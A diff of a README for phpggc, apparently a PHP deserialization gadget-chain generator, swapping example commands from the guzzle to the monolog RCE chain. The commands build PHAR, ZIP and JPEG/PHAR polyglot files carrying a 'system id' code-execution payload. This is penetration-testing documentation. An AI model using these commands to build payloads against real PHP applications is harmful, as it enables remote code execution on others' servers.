@@ -132,11 +132,11 @@ Polyglot files can be generated using `--phar-jpeg` (`-pj`). Other options are a
 
 ```
 $ # Creates a PHAR file in the PHAR format and stores it in /tmp/z.phar
-$ ./phpggc -p phar -o /tmp/z.phar guzzle/rce1 system id
+$ ./phpggc -p phar -o /tmp/z.phar monolog/rce1 system id
 $ # Creates a PHAR file in the ZIP format and stores it in /tmp/z.zip.phar
-$ ./phpggc -p zip -o /tmp/z.zip.phar guzzle/rce1 system id
+$ ./phpggc -p zip -o /tmp/z.zip.phar monolog/rce1 system id
 $ # Creates a polyglot JPEG/PHAR file from image /tmp/dummy.jpg and stores it in /tmp/z.zip.phar
-$ ./phpggc -pj /tmp/dummy.jpg -o /tmp/z.zip.phar guzzle/rce1 system id
+$ ./phpggc -pj /tmp/dummy.jpg -o /tmp/z.zip.phar monolog/rce1 system id
 ```
 
 
